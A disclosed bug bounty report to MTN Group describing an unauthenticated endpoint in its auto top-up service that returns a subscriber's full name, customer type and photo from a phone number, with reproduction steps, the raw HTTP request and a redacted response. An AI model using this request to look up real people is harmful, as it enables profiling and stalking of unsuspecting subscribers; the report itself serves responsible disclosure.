# Information Disclosure Leads To User Data Leak

## Report Details
- **Report ID**: 1541660
- **URL**: https://hackerone.com/reports/1541660
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2022-04-14T20:48:45.048Z
- **Disclosed**: 2022-12-24T13:34:44.220Z

## Reporter
- **Username**: netboy
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: mtn_group

## Vulnerability Information
Information disclosure is when a web application fails to properly protect confidential information, which causes revealing sensitive information or data of the users or anything related to users to any third party.

## Summary:
Am able to get any MTN users data such as FULL NAME, CUSTOMER TYPE AND PICTURE.
I can get those data by using only phone number of any MTN users.
VUL URL: https://mtnautotopup.mtnonline.com/autotopup/app/sign-up-phone 
VUL URL: https://197.210.3.135/autotopup/app/sign-up-phone
~NOTE: Tested with a Nigeria phone number that belong to me.

## Steps To Reproduce:

  1. Visit `https://mtnautotopup.mtnonline.com/autotopup/app/sign-up-phone` or `https://197.210.3.135/autotopup/app/sign-up-phone`
  2. Put in a phone number and catch the request via BURP
  3. INTERCEPT  the request of `GET /vtu-service/api/pwa/pub/get-bio-data/081*******`
  4. The response contains Fullname, Customer Type and Picture of the user.

## Supporting Material/References:
VUL REQUEST:
```
GET /vtu-service/api/pwa/pub/get-bio-data/070******** HTTP/1.1
Host: mtnautotopupservices.mtnonline.com
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="99"
Accept: application/json, text/plain, */*
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Origin: https://mtnautotopup.mtnonline.com
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://mtnautotopup.mtnonline.com/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```
RESPONSE:
```
HTTP/1.1 200 OK
Date: Thu, 14 Apr 2022 20:11:05 GMT
Server: WildFly/10
X-Frame-Options: https://mtnautotopup.mtnonline.com, https://mtnautotopupservices.mtnonline.com, https://billable.mtnonline.com, https://mtnautotopup.mtnonline.com, https://mtnautotopupservices.mtnonline.com, https://billable.mtnonline.com
Access-Control-Allow-Credentials: âtrueâ, âtrueâ
Access-Control-Expose-Headers: origin, content-type, accept, Authorization,Access-Control-Allow-Origin, origin, content-type, accept, Authorization,Access-Control-Allow-Origin
Access-Control-Allow-Headers: Access-Control-Allow-Headers, Origin,Accept, X-Requested-With, Content-Type, Access-Control-Request-Method,Access-Control-Request-Headers, Authorization, Access-Control-Allow-Methods, Access-Control-Allow-Headers, Origin,Accept, X-Requested-With, Content-Type, Access-Control-Request-Method,Access-Control-Request-Headers, Authorization, Access-Control-Allow-Methods
X-XSS-Protection: 1; mode=block
Referrer-Policy: origin-when-cross-origin
Access-Control-Allow-Origin: *
X-Powered-By: Undertow/1
Content-Type: application/json
Cache-Control: max-age=0, public, no-cache, private, no-store
Expires: Sat, 16 Apr 2022 20:11:05 GMT
Access-Control-Allow-Methods: PUT, GET, POST, DELETE, OPTIONS
X-Content-Type-Options: nosniff
X-Content-Security-Policy: default-src 'self' *.mtnonline.com
Strict-Transport-Security: max-age=631138519; includeSubDomains
Feature-Policy: vibrate *; usermedia *; sync-xhr *
Access-Control-Allow-Methods: PUT, GET, POST, DELETE, OPTIONS
X-Content-Security-Policy: default-src 'self' *.mtnonline.com
Feature-Policy: vibrate *; usermedia *; sync-xhr *
Connection: close
Content-Length: 295017

{"responseCode":"00","responseDescription":"Successful","firstname":"EXPOSE","lastname":"EXPOSE","othername":"EXPOSE","customerType":"Prepaid","profileImg":"EXPOSE"}
```
NOTE: I replaced the exposed data with EXPOSE.

## Impact

An attacker can retrieve any users data (like full name, Customer Type, and Picture) by just using the victim phone number.
This can be use for information gathering about someone for malicious use or criminal activity.

## Attachments
No attachments
